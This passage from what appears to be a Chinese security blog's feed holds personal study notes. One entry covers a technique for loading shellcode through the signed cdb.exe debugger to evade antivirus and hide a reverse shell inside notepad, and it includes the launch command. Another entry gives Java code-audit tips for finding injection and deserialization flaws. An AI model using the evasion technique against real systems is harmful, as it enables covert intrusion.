b70fbf736a5f5b9267dc1d74f1f966b0a93f128ebde942ce41cd7344359f4b973597aa8d1dd8b2ec85b06dacbb17edcb2cd783727af02dd0ce2e5cc339fcb8aa07de2047a23e186b34a40f4bc9335239a1ab08ea77606315714cd6e30c489900bfd5de2469b900ae68603b6d60841df9ce9c70f562fd4c4fc1522030721becdb51ff1d95164ab59297ef9e6ec9318f44dba9860a4f8c5df62b7ac08e772ce0bb0a48082f9f38e1640d44118983d5abf44e2b436e8bbd96df465e4e90d39d084dcb3130ec96e655b9ab506431242190432c96a2e409ceb691e7325176a6ad44355555f11277f0e199c20d3f7b65e3fd68b2445bf3ecf0c67ff37604fdf9b2f3083eaec18bdc53e53f7d3129502e85dbbc73e8799e122fc3994ae64bd22eedaf27516ffd577ec5867b1143021aa7dbdf5829c45750779ff4353f891ce464b611df2bdc4504884d3d0618a791e56307488eeacb0417dafea7facd613047218218a3e1acaaff6722e6c217d3e0c78760e221abbbfa8d114ebe08f6883666d1732bfd1bf5a2638ad8a9b1bac57bb0ce57bc9336d4c82fd0431ae2671640fb670ab11f31f1a6f15c5335eae64dffd579023134070250de23b2b8905f0023caa3173165d0fb780647a4a8d7731fb1439a272411386eab1ccde8ccab2c407b932e028854fc2fe09c8672badd2c02ac665eabc9842bcd6ef1ceac3693b73180d829982be764b1c5923c1db7fbeac7397cc7816e03e88fa78efd717e15e100e23dfbb59840b62d9c0c650fb8d5aaf026bfe6a74f470a90ef74f85b77c2a201e0ba7a3a362b1bb748d9fac080f75af669fc0d109fe83d006d75a512e7ec63470b47c2e4dc793c250fb266981cac398a4214f4005dd0443f57984f9d45a39bf746bf4e499eae59c2acf43090d12a1edfd7c5639fe229e9ee7e89fce19447e21c0a8912cb35e0a3af37786677f6e0db81328bad23162dbd5136f4aceb82a2eea7d9eebc4814962fc94e530aebc1825f48f7e42e9ec099736ebb2bfbba76b3c8ac0c67f5e77faf11644fe5480048d3f4fc8bda16c7915b7b35f4eee43742b6e305a975e54dddcef62191868d49ebae268ed68a6b088856cdf31b3558e858a41d25dde9d5cc58dc51a01fc976f05284b21ac90b9e3512cef1fdb29f505191aee2c49a6c911701206acdcab25a5c4c97be36484a8718ce5ba2e4afa22d6f0d5cee1b271ac28f38bd20b60b6f93319a85a15c61b3399a2a47b2d502d344c643244863fb7956d6f48334057b4eb898311724d21800be30a5b66d1dd582f96a222afe9e311a9f73e3cfe739a0e3bac2df3a6a4e611439b376d733b268a50c736c476f3f35c0750aa31e3caa46b5f37b0ab462f4e76d8220e3d17305021dd763946dd87d475a9be67a5ff1ecd384c3ed982f16cac2e495ae6284785ad04e93d012b31cffbd8dfe1ce1c859b02a3ab575bb225b453a3774bd9c998163d199e990af881cd19254f17e03cec384e90c40ffa12271d585cfb5913e4ace11637a5da63ae51d4d862de4d071ce16e5ae09024498c031c524826d286c1867234a6abba9f56650b6a95f9efb5a6e2a983be24c527be89413c433bdc44e5ab6a272def9cdfca992de169c00daa8118f60f63334d9e94ff860ae34711c0acf31c83a2f9b724fb16efe7cadc86d2e8a00449a97a68a97521af4b04942ed97dcddea6dab5315930f6ea269a694d5a8261751aa7bcd931ae3d525c50feba04e96e39b228d3d5fab04847003e2ee1b862724ef5b06a1927823e0648f1dbb6fba1205f197224a82cc91fcd5dd09762d4a975c2cabd7c25f7794328a2be5950c3b7e3bd25dbd8714c80a0de43115f4ff4563d23d2a41a1b39d7711e32142d6e1540afeda208d2fe6090fe70661e424fefbffce61806052ef6ff302fa3afb80a9ab4de4b4d7ed5ad0936f272daf68224861c79b097a0fde761d81f5ce61a6cb874d08385ac292338c703e104eb15f8cb92ea5834bbbb6c954277a3f6ebb1190fc2f108e761fa77997f8cb0c60ec0247b060a0b734e372ac4227a452b7b21866c50ead837facf09ed3eb12a2a91df9788fb979850f2c499913188590b38698b2ba60ecb11fc09d7c2151724a7bd4cc56b129049c6135a64463d75df54c2396bc0226db558ec56f70c7e5f8aeb2d335634dd3b569eb4d479898f205953a1a8c924d8e920258cb1c208669b700c58c44b2fa65cb2f72ebf7b16cbbadc71cd77d4b14db4ec732c1e548a15d76d8544afc91dc09e635a21fa33e2c5e5718bcfb7462f84828e8eb4b4fbf7128e381e423088589e0eb762f8f5d60d50b726712f64497920b0c675ef789b3b53175e41bca4b62b0fdfceb3b59d45e562aa3479fe19b7b974fc340252d43ac9d06baa7702f321317cffcd15409b4c511d170d38a934882966dcd2d76357565173a1c9ee646701906672e7939a0ecf42338c511b0b83a99ba0b430e359e23f41a8b9d453b0f890fd2c4195997cfb7d0163b50f5f37885296e74b9de809b323411a8dcd029eb5e187800627778ee15e254c49de235a5049ace81f706a7a2ee72107efdae3cbdd1bbb3c8dae7a505ee7eb1ef044cd0d4c178f882b0870ac268cf2ab71f2dc3868ce2e4c395ca164bce98fd855a245ceaf07eead1c48aeaf4d0a4301d6bed30faa8c2822fbf2bf6f5a459f6ce0392684a9cfc3c16e9a50f2d0d82041a8927d3ac4c83c040761722d7e957980b66c1f1eb97e4e1db6fdd554fb0d4fd5edbc296226bea4de76444411dd76607ba19752a1c150a0600c654c7b071c08128eb34d21fe4ad3f1469c13e091941ea252659754d63c4ea6af1ac0a2a16e74106a04695589a09f5d368d97f9b63dfe2692dc6712c4666a279752af2b00a46bb5b7806c90e8146519d87541472381b76f233775165f9f201822d59401577f27b4c4c5315226b73aabbe40ee78683493f0cfd63993b4f4c409e594978ddeae26c4b54288810c65cd009a923dfc71b5a7c8a35ee76653e4d56f05499027e7a55e777e252b5aa5bd28d0a37cb4f8595269239a1a40246a00d2685fa4cab03247ee8b49e2da2eb76271d6de1f3d50b9b0d4fe1206bf73169719a8259afd666fd3e60ee9ea45f84dbc83d75cf2e36721c227538d806b0521d9784574a80fe4e72d8f4baa8316cb7adc8127133e69cf6494c29df955a14e03c593060fc4e93fde5e9be505e34b800de55d7e2b2c461c3cb2022577e9390628cb49ebbdc232479d4960eb150ec93ce03db06c8094848c0090cb5a2c624272e2e8734a83cd82df502fe98329e05911f7e1283d0013ab73a5ebf6b554e6d5ffa0e1c6495bf3e061cae5a9963d2e5a01c34bf15234cc945b5f2be756a3abdbf8f467c86dbb8a4232daf67481792c1ce76d7bd079c7b93138d4e1d4fd35a672b0873964b2355513e1e71834ecd50a7c79a8576697ab9d8c1035df6d162f9a7b532469cdba67d73661302fd0cee1cbfe8474b0473491deb3046bf72380d8dc8111c57d85436ad962cad761f7aeaceacf0bee5d7ce73375620a96123f047881994903a89d30c371b14b0199bf37f8c43241efb3563ab2e27bb15031aa19c37e72290dca6506f06778045e41b72f90e22c494bb42b515fcc0d58defc1e23fd31e189563820f28f7c11071460c7581bdfb7d63ee2fae988360a4687c6ddd4ec59c670553071ee0bad2bace856a7e93d6ccb98013c960b6281e194038f5edeb8191bcfa2e5a38eb26405fa8dd414840b0f6c0c06eb927901ba05eedd8416e63f2c8e9e930e6dac85cdb3675ae6d58d64347094ab7ad4b3740a815a65b04a33bd5324d6375d8493bc6c84faac548a613ea076791df249d686c0d92e8b2e6fdd07eb3074720393e81d61fae7103c62d1db88dd226f488b33b242e5f028b3fe45df034e88d4dc3b3f481925cf96e594ed55aeae4f99d05517d4ef5a78c2895b95346b50b63e5976f5dea540d1719798c47ed78ef2c8ca5106b3cbab65b8c4d75fa74eb141008f13b0ea263df8369119397ea2d9af67542d6be83582ec6c48c2cab3d4884003b50f05cca986c879d7fc8de0c0abf2030f7a003b7057bb7709994525fe0f4f7eeb0a74273b17e36a85ea4f25c3bca5f2fce10271786530d47f302c149246121289e62ad09873626d6a41e0f98ecc78f89c5d1fffa6cef80ee151f312e0a2b45d0f08643f85e213e067d079a7b4c0d41be855b597574609dea5f28ac51051f66b5ac16989c59a85779267516f15363c12df19653989def7c7569fe8f507b56741684f08936bb1a8df322345bb7faf66599ad66d1340ce7663f87a05ae4be9fc5c86504988406dd625f3896263c8dfea53fb61d90540a034e7da080dadde9ea3a0bad445aaf8efbf910b37955387ef3356e0a29cbe8d878126a4ed67d6f65f35c0532e79e70ae46505c2c8c4db5e97dca596e17fff2507e26b4182c834b45def4d7c2047cf155b26790f3eb8b2b14d57606b15cc27c964a1500e1a03ba50b667f6bea21a56d005f04d9ec971f6fcc9e5fdcf4656cd3081ac9931cee798d7e01ee34029b7717167c48b2a1b39c55ce5ce64bca5e524ac0e98cb45408f5b0491a5721e2520671faaa6a36fe21d24b404db1743b187d9cc769dc99a04d0aae9c9bb027903cfea7148985228a481915e384af1cd0e68855f8dbe7d3ef397fa36f62a3db18da57a36daf9b54bd3e0b749a5bf9da3f08c5a15e0621df60812c1538513f0e51c4ce69ffdeda506f9a4ea2dcf1b055aa4778f2cb842a6b44ef20138eb01bf6e44fcdefce51cc89efca32b83bf02dbe38141290969a540f644be5deccb05c3e724848e263ffe716c1917f9008ef588d60451a7d99df6ad009eb5882cef6c04f4f1876a17472debc03726b7224208120160ad755dde7ffcae12aa401e695f3b577f3c1a789bf790b738a9bf8ffba0b5e7859881e31b34a43135f2da9a57a85bbc2d289ea975409df0085268d60b0c4d60a41cdf92c2b4cdd5b917a8a5878edc6cbae59179e7234f90fe5cfb9c91172a738b4461b239c69ed26149b2ec30987b375d35b42cc0c2f568c2aa4be27b4070138eeee4528c79916196f331141025d17da415df16809dbd32ceb4c49c89de5d16cded09e6d66135690b4380da6f714508d827bd9f915db3a7999c1736ab207c169c08eee386a89844fe4f60953eab34f8af8b7d568caefb6f43e6c17fe46c6c96ae740c9dea83e5bdc8661034640e2b539ecdf414135d464cafbca474a137cc329d14e5e876549c3aac1b02ef8b5a67a87379f1b0d6e8569ae1417be7fe6880bf0437be4869807d89c32c5ac7f7dfd1c025b1ec83dfe988441c6a1992a374b4a2b7aa4117088f6c27a7319d3e0ac8f26f01424c7e182878bae2b0b385f856e01fdc58c704265babba7c00e4d068d13ae551e497452dcb10a5931fdcf5d04a105cc73b35a2d5c41b44667c834e2f52fe977d0fffc2a8c119b10a6434435b276d3b198439e113760db108821152a7d2fcdb2a9fba82fb1bf355a01f4e688d4973dca75d08dff7f1d8471f73f420282f5cf00e7c3f286c4edc66010e61748499902209c318ba1ce856b0a29579f3315f8fbd2c2e53864b8f6cc9fe31a13b3483b2244ae065b7090490ce560f9af221309b3e3e45e317fd0447183ade3123b996dba12589e90653a53a676ef40270661005d489f44ad8ffdc8aac2290666d84a2f4ad9541c5ba7334f33efe4fe6397aebba3fda30491b654fcb1f780cc6190806b3626c70846d4382e291e570e1e76b87476d6f52b701b3d58e20bf8584f337d0656b503505b3dbe7abd1871607030901c71cd33bd643c4d2fb56a1faf921cfbd8cb087a2ebe9dfaa25219a</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">请输入密码</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>红队 免杀</category>
      
    </categories>
    
    
    <tags>
      
      <tag>学习笔记</tag>
      
      <tag>Hexo</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>(分析)利用白名单文件 cdb.exe 执行 shellcode</title>
    <link href="/(%E5%88%86%E6%9E%90)%E5%88%A9%E7%94%A8%E7%99%BD%E5%90%8D%E5%8D%95%E6%96%87%E4%BB%B6%20cdb.exe%20%E6%89%A7%E8%A1%8C%20shellcode.html"/>
    <url>/(%E5%88%86%E6%9E%90)%E5%88%A9%E7%94%A8%E7%99%BD%E5%90%8D%E5%8D%95%E6%96%87%E4%BB%B6%20cdb.exe%20%E6%89%A7%E8%A1%8C%20shellcode.html</url>
    
    <content type="html"><![CDATA[<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>利用白名单文件 cdb.exe 执行 shellcode</p><p>cdb.exe：自带微软签名的白名单文件<br><br>calc.wds：示例wds文件，用于启动calc<br><br>shellcode2wds.py：处理脚本，将处理后的shellcode转为wds格式<br></p><p>参考文章(使用说明): <a href="https://ryze-t.com/2022/03/23/cdb%E6%89%A7%E8%A1%8Cshellcode/">cdb执行shellcode | Ryze (ryze-t.com)</a></p><p>真实环境中进行测试前先在同版本虚拟机中测试，若想反弹shell，要用 reverse tcp 的shellcode</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>就是将raw.bin转换为wds格式 然后用白名单文件cdb.exe读取 从而达到免杀</p><h2 id="而且有个优点是-反弹shell的话可以隐藏进程"><a href="#而且有个优点是-反弹shell的话可以隐藏进程" class="headerlink" title="而且有个优点是 反弹shell的话可以隐藏进程"></a>而且有个优点是 反弹shell的话可以隐藏进程</h2><p> 看如下</p><p>去掉 \x 、” 等字符之后，保留原始 shellcode 字符</p><p>&#x3D;&#x3D;像这样&#x3D;&#x3D;</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202209142119794.png" alt="image-20220914211950752"></p><p>&#x3D;&#x3D;通过python shellcode2wds.py进行处理：&#x3D;&#x3D;</p><p>生成shell.wds文件后，将 cdb 和 wds 文件复制到被害机器中，执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Bash">cdb.exe -pd -cf shell.wds -o notepad.exe<br></code></pre></td></tr></table></figure><p>可以看到正常上线：</p><p><a href="https://ryze-1258886299.cos.ap-beijing.myqcloud.com/20220329100837.png"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202209142115631.png" alt="img"></a></p><p>查看受害机器进程：</p><p><a href="https://ryze-1258886299.cos.ap-beijing.myqcloud.com/20220329100839.png"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202209142115623.png" alt="img"></a></p><p>可以看到是在 notepad 进程中存在 tcp 连接，隐蔽性相对较高，且由于shellcode没明显特征，cdb 有签名，因此免杀效果很好。</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>需要分析的话就是分析shellcode2wds.py了</p><p>直接看代码的话就都是结果了</p><p>尝试分析cdb.exe和wds代码构造</p><h3 id="wds是网络格式"><a href="#wds是网络格式" class="headerlink" title="wds是网络格式"></a>wds是网络格式</h3><p><a href="https://baike.baidu.com/item/%E6%97%A0%E7%BA%BF%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F/639419?fromModule=lemma_inlink">无线分布式系统</a>(WDS)的无线混合模式，可以支持在点对点、点对多点、中继应用模式下的无线访问点(AP)，同时工作在两种工作模式状态。即：<a href="https://baike.baidu.com/item/%E6%A1%A5%E6%8E%A5%E6%A8%A1%E5%BC%8F?fromModule=lemma_inlink">桥接模式</a>+AP模式。无线局域网络创新的无线分布式系统(WDS)，改变了原有单一、简单的无线应用模式。比如：大型热点区域和企业用户选用无线WDS技术的解决方案的时候，可以通过各种可选的无线应用方式来连接各个AP，这样就大大提高了整个网络结构的灵活型和便捷性。特别值得一提的是：使无线网络使用者以购买最少无线设备，达到更多用途的功能实现</p><h3 id="其他的难找且没精力找，那知道有这个脚本存在就行了"><a href="#其他的难找且没精力找，那知道有这个脚本存在就行了" class="headerlink" title="其他的难找且没精力找，那知道有这个脚本存在就行了"></a>其他的难找且没精力找，那知道有这个脚本存在就行了</h3><p>因为太冷门了  当然这个技巧还是很有用的</p>]]></content>
    
    
    <categories>
      
      <category>白名单</category>
      
    </categories>
    
    
    <tags>
      
      <tag>学习笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>java代码审计小tips</title>
    <link href="/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%B0%8Ftips.html"/>
    <url>/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%B0%8Ftips.html</url>
    
    <content type="html"><![CDATA[<h2 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>、找最新版的版本较低的，例如<span class="hljs-number">1</span>.<span class="hljs-number">1</span>、<span class="hljs-number">1</span>.<span class="hljs-number">2</span><br><span class="hljs-attribute">2</span>、找github star不多的<br><span class="hljs-attribute">3</span>、找源码总容量小的<br><span class="hljs-attribute">1</span>、如果cms版本高，说明开发有经常维护，同时也说明里面的简单漏洞已经被发现并且被提交并整改了。（具体这个可以看看CMS官网放出的更新日志）<br><span class="hljs-attribute">2</span>、为什么找github star不多的cms？很简单，使用的人不多，没人标星，功能也比较少。<br><span class="hljs-attribute">3</span>、源码少容易看啊，而且想着源代码就那么点，看着也不会太心累。<br></code></pre></td></tr></table></figure><p>-javaagent:G:\dongtai-agent.jar</p><p>接下来我要突破瓶颈了  不搞那些浅显的东西了 至于低级的东西这里也不会讲了 </p><p>接下来我将会学习涵盖各种cc链 各种代码框架rce流程</p><p>各种骚姿势。各种内存码写法 各种利用方式。为了节约时间 那些基础的东西也不讲了</p><p>这里只有精华</p><p>1.combo </p><p>2.重点看这个文章里运</p><p>用了哪些技巧，比如如何绕过过滤、用了哪些偏门gadget。其次关注这个产品、这个组件它的整体框架逻辑是什么样的，他有哪些有趣的功能机制是可以拿来串联链。</p><p>3.我们可以忽略什么？繁琐的各种函数跟进，根本毫无意义，随便看看就行了，除非你也专门研究这个产品的0day挖掘那么你可以细致的看一看，如果你想用它来挖别的产品那么你可以直接忽略掉很多没有用的函数跟进，只看那些对数据有一定复杂过滤操作的典型函数就行了。</p><p>4.即使我不懂Go，我知道我需要找到什么、需要去串联什么，剩下的不过是百度百度看不懂的语法罢了。总之就是一句话：<strong>just do it</strong></p><p>-javaagent:G:\桌面文件夹\任务\第三阶段\作业二\审计框a架靶场\dongtai-agent.jar</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202206011153860.png" alt="image-20220601115349651"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202206011155165.png" alt="image-20220601115521088"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs assembly">密码硬编码最容易找，直接用 Sublime Text 打开项目目录，然后按 Ctrl + Shift + F 进行全局 搜索 password key关键词：<br><br>反射型 XSS 一般 fortify 一般都能扫描出来<br><br>存储型 XSS 审计方法：方法有主要有两种： 1. 全局搜索数据库的插入语句(关键词：insert,save,update)，然后找到该插入语句所属的方 法名如(insertUser())，然后全局搜索该方法在哪里被调用，一层层的跟踪。直到 getParamter()或者getpara(有的工程师为了方便用的getpara)方法获取请求参数的地方停止，如果没有全局 XSS 过滤器，跟踪的整个流 程都没有对获取的参数过滤，则存在存储型 XSS。<br><br>\2. 从 getParameter 关键词开始 ，跟踪请求参数，直到插入数据库的语句，如果中间没有过 滤参数，则存在存储型 XSS。<br><br>SQL 注入一般 fortify 一般都能扫描出来 手动找的话，一般直接搜索 select、update、delete、insert 关键词就会有收获 如果 sql 语句中有出现+ append、 $（） getConnection连接数据库# 等字眼，如果没有配置 SQL 过滤文件，则判断存 在 SQL 注入漏洞<br>limit，orderby后面是不能预编译<br><br>当找到某个变量关键词有 SQL 注入漏洞时，还可以直接全局搜索那个关键词找出类似漏洞 的文件，<br><br> 任意文件下载 审计方法：全局搜索以下关键词 fileName filePath getFile getWriter<br><br>6 任意(越权)文件删除 审计方法：任意文件删除漏洞搜索以下关键词可以找到： delete, UserController   deleteFile,fileName ,filePath <br><br>文件上传 审计方法： 文件上传可以搜索以下关键词：（需注意有没有配置文件上传白名单） upload，write,fileName ,filePath 在查看时，主要判断是否有检查后缀名，同时要查看配置文件是否有设置白名单或者黑名单<br><br>命令注入 审计方法：可以搜索以下关键词： getRuntime,exec,cmd,shell<br><br>缓冲区溢出 审计方法：主要通过搜索关键词定位，再分析上下文 可搜索以下关键字： <br>strcpy,strcat,scanf,memcpy(md5memcpy不存在缓冲区溢出),memmove,memeccpy Getc(),fgetc(),getchar;read,printf<br><br>0XML 注入 审计方法： XML 解析一般在导入配置、数据传输接口等场景可能会用到，可通过搜索以下关键字定位： DocumentBuilder、XMLStreamReader、SAXBuilder、SAXParser、SAXReader 、XMLReader、 SAXSource 、TransformerFactory 、SAXTransformerFactory 、SchemaFactory 涉及到 XML 文件处理的场景可留意下 XML 解析器是否禁用外部实体，从而判断是否存在 XXE<br><br>日志记录敏感信息 审计方法： 通过搜索关键词 log.info logger.info 来进行定位 （怎么审计？）<br><br>URL跳转 审计方法：通过搜索以下关键词定位： sendRedirect、setHeader、forward 需注意有没有配置 url 跳转白名单<br><br>敏感信息泄露及错误处理 审计方法：查看配置文件是否配置统一错误页面(在pm.xml查找是否含有errorpage或者404.jsp 500.jsp等醒目代码)，如果有则不存在此漏洞，如果没有再通过 搜索以下关键词搜索定位, Getmessage、exception <br><br>反序列化漏洞 审计方法： Java 程序使用 ObjectInputStream 对象的 readObject 方法将反序列化数据转换为 java 对象。 但当输入的反序列化的数据可被用户控制，那么攻击者即可通过构造恶意输入，让反序列化 产生非预期的对象，在此过程中执行构造的任意代码。 反序列化操作一般在导入模版文件、网络通信、数据传输、日志格式化存储、对象数据落磁 盘或 DB 存储等业务场景,在代码审计时可重点关注一些反序列化操作函数并判断输入是否 可控，如下： ObjectInputStream.readObject ObjectInputStream.readUnshared XMLDecoder.readObject Yaml.load XStream.fromXML ObjectMapper.readValue JSON.parseObject<br><br>不安全组件暴露 审计方法： 通过查看配置文件 AndroidManifest.xml,查看属性有没有配置 false AndriodManifest.xml 文件中，代码 24 行处 activity 组件添加属性，没有配置 false, 默认组件可被导出<br><br>.1CSRF<br>审计方法:通过查看配置文件有没有配置 csrf 全局过滤器，如果没有则重点看每个操作前有<br>没有添加 token 的防护机制<br>在 Smpkpiappealcontroller.java 中 200 处，直接用用 ids 控制删除操作，而没有添加防<br>csrf 的随机 token 验证检查，存在 csrf 漏洞。<br><br>越权操作<br>审计方法：重点关注用户操作请求时查看是否有对当前登陆用户权限做校验从而确定是否存<br>在漏洞，有些厂商会使用一些主流的权限框架，例如 shiro ,spring security 等框架，那么需要<br>重点关注框架的配置文件以及实现方法<br><br>会话超时设置<br>审计方法：<br>Javaweb 应用会话超时设置一般有俩种方法：<br>一是在配置文件 web.xml 设置<br>二是通过 java 代码设置<br><br><br>敏感数据弱加密<br>审计方法：<br>敏感数据弱加密主要看数据传输中的加密方法，一般写在工具类 util 中以下文件中为 base64 编码方法<br><br>未授权 init dofilter destory @WebInitParam<br>yf-exam-lite\exam-api\src\main\java\com\yf\exam\config\ShiroConfig.java 查看是否有shiro配置不当的未授权<br><br></code></pre></td></tr></table></figure><p>application.yml可以找到框架包</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk">网站路由<br>控制器（app<span class="hljs-regexp">/Http/</span>Controllers）<br>中间件（app<span class="hljs-regexp">/Http/</span>Middleware）<br>Model（app/Models）<br>网站配置（config）<br>第三方扩展（composer.json）<br></code></pre></td></tr></table></figure><p>usercontroller等各种controller中的getmapping都可以看一下存不存在缺少过滤</p><p>filename参数一般出现在Content-Dispostion：</p><p>一般sql查询都在service层</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">isAbsolute</span><span class="hljs-params">()</span></span> 判断抽象文件是不是绝对路径<br></code></pre></td></tr></table></figure><p>分析新的补丁去反向查找历史漏洞</p><p>幽灵代码</p><p>1.AOP</p><p>很多java漏洞的修复没有用到任何过滤，却被修复了 这就是java的幽灵代码 和AOP等有很大关系   多看一看这些注解代码<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202206071436206.png" alt="image-20220607143601141"></p><p><a href="https://forum.butian.net/share/1118">奇安信攻防社区-浅析JAVA代码审计中的“幽灵代码” (butian.net)</a></p><p>2.拦截器（Interceptor）<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202206071512538.png" alt="image-20220607151242486"></p><p>跟进代码的话是看不到拦截的 跟进注释也没用</p><p>只能主动搜素Interceptor 或 addInterceptor<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD/202206071510841.png"></p><p>然后找到拦截器 然后找到相似方法<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202206071512699.png" alt="image-20220607151256643"></p><p>跟进找到拦截方法<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202206071513749.png" alt="image-20220607151312690"></p><p>3.Fliter</p><p>先找前面两个 没找到就只能是这个了</p><p>到web.xml里面搜索filter<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202206071521926.png" alt="image-20220607152104885"></p><p>下面那个表示只过滤secret</p><p>这种通用逻辑不仅可以处理权限类型的问题，也可以实现SQL注入、命令注入、XSS等各种漏洞关键字过滤。</p><p>1、在java安全开发中若需要用到对xml进行解析的话，应考虑xml组件默认有没有禁用外部实体引用或者其他安全问题，针对补充安全配置以防止功能点在引用到不安全的xml解析器的时候引发一系列的安全问题</p><p>有些安全人员开发了新的代码用了新的java版本后 没有向下顾虑java低版本的安全性 可能造成漏洞</p><p>Runtime是调用的ProcessBuilder<br>而ProcessBuilder是调用的ProcessImpl<br>所以上面三种方式本质都是调用ProcessImpl创建进程，命令执行</p><p>工控段有很多命令执行 一定要抓包改着都试一试</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">如果找到了不稳定的文件上传点，可以用一个文件包含来和上面这段代码中的 删除 操作进行竞争，在文件被删除之前包含它，来达到执行代码的效果(因为需要条件竞争，可以考虑把这个上传包放到 intruder 里重放个几百次，然后在上传的过程中，去尝试包含 <span class="hljs-regexp">/tmp/</span>TempClass.php ，来达到竞争的效果。)<br>https:<span class="hljs-regexp">//</span>xz.aliyun.com<span class="hljs-regexp">/t/</span><span class="hljs-number">9319</span><br>一旦包含成功，那么在实例化 TempClass 的时候，会写入一个新的 TempClass2，这下可没有代码会去 unlink(删除) 它了，可以被稳定的利用。<br></code></pre></td></tr></table></figure><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">在js找相关接口 上传的话就看有没有<span class="hljs-keyword">type</span>: <span class="hljs-symbol">&#x27;POST</span>&#x27;啥的<br></code></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">有的时候尝试访问之后发现这个上传接口不能随意访问，所以还得从程序入口开始审计哪里做了鉴权。鉴权的话找找hook类<br></code></pre></td></tr></table></figure><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">内省一个实际就是获取到这个<span class="hljs-keyword">Bean相关的所有方法</span><br><span class="hljs-keyword"></span><br></code></pre></td></tr></table></figure><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs llvm">如果发现有反序列化漏洞的话（使用了低版本的<span class="hljs-keyword">cc</span>链）<br><br>直接找readobject<br></code></pre></td></tr></table></figure><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gcode">如果发现有lo<span class="hljs-name">g4</span>j的话（使用了低版本的lo<span class="hljs-name">g4</span>j链）、<br>寻找漏洞利用点，搜索有没有存在参数可控的 logger.error<br><br>只要参数可控 就算多重参数 选取其中一个可控的就行<br>即使参数加密 我们反加密就行<br></code></pre></td></tr></table></figure><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs 